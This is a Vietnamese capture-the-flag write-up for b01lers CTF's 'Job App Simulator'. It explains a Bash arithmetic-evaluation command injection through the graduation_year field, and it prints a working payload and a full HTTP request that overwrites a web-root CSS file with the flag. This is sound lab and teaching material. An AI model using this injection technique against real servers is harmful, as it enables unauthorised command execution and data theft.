# Báo cáo CTF: Job App Simulator (b01lers CTF)

## 1. Tóm tắt lỗ hổng
Bài thi "Job App Simulator" chứa điểm yếu bảo mật nghiêm trọng trong tập lệnh backend `application.sh`. Lỗi xảy ra do đoạn mã Bash xử lý dữ liệu POST đính kèm biểu thức toán học (Arithmetic Evaluation Context) trong toán tử lớn/nhỏ (`-lt`). Thông qua việc lợi dụng cơ chế đánh giá chuỗi ngầm trong biến mảng (`declare -A`) của Bash, kẻ tấn công có thể chèn các lệnh thực thi ở máy chủ (Command Injection).

## 2. Phân tích chi tiết mã nguồn
### Điểm chèn (Injection Point)
Dữ liệu gửi lên từ ứng viên nằm ở định dạng `application/x-www-form-urlencoded`. Toàn bộ dữ liệu này được đọc và chuyển sang biến mảng `form_data` của Bash tại các dòng:
```bash
declare -A form_data   
while IFS='=' read -r -d '&' key value && [[ -n "$key" ]]; do
    form_data["$(urldecode "$key")"]="$(urldecode "$value")"
done <<<"$request_body&"
```

Xác nhận tại file `application.sh` (dòng 74), giá trị `graduation_year` được kiểm tra tính hợp lệ bằng lệnh:
```bash
if [[ "${form_data[graduation_year]}" -lt 2026 ]]; then
    echo "Invalid graduation year"
    return
fi
```

**Nguyên lý khai thác:**
* Toán tử `-lt` (nhỏ hơn) thuộc về mệnh đề toán học. Bash bắt buộc phải phân giải hai vế dưới dạng biểu thức toán học.
* Nếu giá trị của `form_data[graduation_year]` có dạng biến gọi mảng `a[<biểu_thức_con>]`, Bash sẽ tiếp tục lấy `<biểu_thức_con>` ra để tính toán.
* Nếu tại vị trí `<biểu_thức_con>` ta chèn lệnh bash `$(command)` thì lệnh này sẽ lập tức được thực thi trên server với đặc quyền của User web (web worker - ở bài này là `www-data` theo thiết lập chown).

### Thiết kế kịch bản lấy Cờ (Blind Injection bypass)
Khi kết quả của biểu thức trả về lỗi cú pháp, toàn bộ Output bị máy chủ hấp thụ ngược vào hàm `$(generate_content)` gây ra việc không trả ra giao diện (Blind). Thay vì cố ép in ra ngoài qua File Descriptor gốc, ta có thể ghi đè vào tĩnh ở phân vùng web hiện tại.

Soi file `Dockerfile`, cấu trúc file cấp phép phân vùng htdocs như sau:
```dockerfile
COPY flag.txt /
RUN chmod 777 /flag.txt

COPY --chown=www-data index.html index.css /usr/local/apache2/htdocs/
```
Biến tĩnh `index.css` nằm trong web-root của hệ thống thuộc về user `www-data`. Ta hoàn toàn có thể trỏ kết quả của tệp tin `flag.txt` để đè thẳng vào tệp tin này, thay thế toàn bộ thiết kế giao diện bằng nội dung của cờ.

## 3. Quá trình khai thác (Cách ghi đè file CSS)

**Bước 1: Thiết lập Payload**
Câu lệnh hệ thống mà ta muốn máy chủ thực thi là:
```bash
cat /flag.txt > /usr/local/apache2/htdocs/index.css
```
Ta sẽ bó nó vào dạng Array index:
```text
a[$(cat /flag.txt > /usr/local/apache2/htdocs/index.css)]
```

**Bước 2: Gửi HTTP Request độc hại**
Chạy trực tiếp qua `cURL` hoặc sửa trên công cụ bắt gói tin `Burp Suite`. Cần đảm bảo dữ liệu Payload của URL được trích xuất (URL Encoded):

```http
POST /cgi-bin/application.sh HTTP/2
Host: job-app-simulator-...b01lersc.tf
Content-Type: application/x-www-form-urlencoded

first_name=A&last_name=A&email=a@a.com&phone=123&resume=A&school=A&degree=A&q1=on&q2=on&q3=on&q4=on&q5=on&graduation_year=a[%24(cat%20/flag.txt%20%3E%20/usr/local/apache2/htdocs/index.css)]
```

**Bước 3: Lấy Cờ (Flag)**
Ngay khi thực thi gửi thành công (Web server vẫn xuất file HTML rỗng trả về mã 200 OK kẹp thông báo Invalid Graduation Year), truy cập địa chỉ CSS qua trình duyệt: 
```text
https://job-app-simulator-...b01lersc.tf/index.css
```
Trên màn hình trình duyệt lúc này sẽ hiển thị nội dung thuần của file `/flag.txt`.
Cờ của CTF đã được lấy thành công.

## 4. Tóm lược (Conclusion)
Việc sử dụng trực tiếp các đầu vào chưa qua kiểm duyệt bên trong mệnh đề so sánh toán học của Bash là cách để lại lỗ hổng thư viện cực kỳ khó lường. Bài học lớn nhất là luôn "sanitize" (làm sạch) hoặc validate Type cẩn thận cho đầu vào trước khi sử dụng các mệnh đề so sánh `-lt`, `-eq` trong Bash.
